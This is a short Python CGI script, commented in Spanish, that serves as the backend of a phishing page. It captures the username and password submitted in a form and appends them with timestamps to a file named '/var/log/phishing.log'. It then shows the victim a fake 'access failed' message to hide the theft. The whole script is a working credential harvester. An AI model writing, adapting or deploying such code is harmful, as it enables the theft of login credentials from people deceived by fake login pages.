#!/usr/bin/env python3
import cgi, cgitb, datetime
cgitb.enable()

# Cabecera HTTP con doble salto de línea
print("Content-Type: text/html\n\n")

form = cgi.FieldStorage()
user = form.getvalue('user', '')
passwd = form.getvalue('pass', '')
logfile = '/var/log/phishing.log'

with open(logfile, 'a') as f:
    f.write(f"{datetime.datetime.now():%Y-%m-%d %H:%M:%S}: {user} / {passwd}\n")

print("<html><body>Acceso fallido.</body></html>")
